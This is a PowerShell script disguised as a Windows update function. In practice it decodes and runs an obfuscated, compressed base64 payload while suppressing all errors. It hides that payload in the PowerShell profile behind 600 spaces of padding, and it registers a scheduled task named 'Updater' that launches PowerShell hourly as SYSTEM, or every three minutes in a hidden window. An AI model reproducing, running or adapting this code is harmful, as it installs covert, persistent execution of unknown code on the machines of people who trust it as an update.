function Update-Windows{
Param([Switch]$Persist)
$ErrorActionPreference='SilentlyContinue'
$Script={sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('dVPfT9swEH6v1P/hFJXV0YjVH+oeqEBiBSYEKxWpxANCk5scjUdiR4mr0EH/952TtE03yENs3d1333fnu06sdXqBsVj/lHEscwy0CnM4hWGPvnar3eqkeaRzQ6YlGs9eS1shVagLstZ+vpI8E8VKkldhkcs/WDmrQL5YPT9jZs37AB6hXEamZmvYCxmaiMz9Ua9B1shhU9fBn/BVx2d8/Y/ImlR7+AFVu1VEMkZgHZOt0IU3wuRGZGYuExv5g1p0IYzlDGKJynJNsfDuFr8xMOCvc4MJn6Lhvg5e0OR8PplNykjmJJjJF83DUOVcoXGOh8OhO6b8GYrEyqhSciLxSxtzx4+LtcHHp6eOPe279Tj/NhoNR+9Hb73NuFTLWEdaeJWI36MIWRV/DL1jqK78FtXSRK4LnkLouW/jTiiMIBxrFODN1ylOBdValzLHV8PP/cn19aUKdCjV0q310XXLYkmkrQRVuBDBi00q8RUqhsHZlz68w93KeBUMGqEDKJVvgV/Bmfng0MnSInT5TNDTkfEMnBpDhDb9o7HCsNb0dHJSaiy1fbea2J5h12L+kEmDbJeHdO/u2/bsYq/iVR4xdzPevsok1jkyF+jpCfP/PNhFq5JYfbsYD/YD5PK5NiJubiIBDXnuMRFS2d5QNz5eWQ8aFO0WyGf2D9RbGnpYcoGdWyg/33J7foyYgneQ7xBcxm/obyt6SGQ9Dw9SDQe/ZpkOMCcJVzI2mIFjJ+S0m+qCtjXCOOb4il04n17ARCeJUOGtpCG7vb65hO7RzK40DZMKkKd5/6jrtFsbu2p/AQ=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()}
if($Persist){
if(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator'))
{$Prof=$PROFILE.AllUsersAllHosts;$Payload="schtasks /Create /RU system /SC HOURLY /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive`""}
else
{$Prof=$PROFILE.CurrentUserAllHosts;$Payload="schtasks /Create /SC MINUTE /MO 3 /TN Updater /TR `"$($Env:SystemRoot)\System32\WindowsPowerShell\v1.0\powershell.exe -NonInteractive -WindowStyle Hidden`""}
mkdir (Split-Path -Parent $Prof)
(gc $Prof) + (' ' * 600 + $Script)|Out-File $Prof -Fo
iex $Payload|Out-Null
Write-Output $Payload}
else
{$Script.Invoke()}
} Update-Windows -Persist
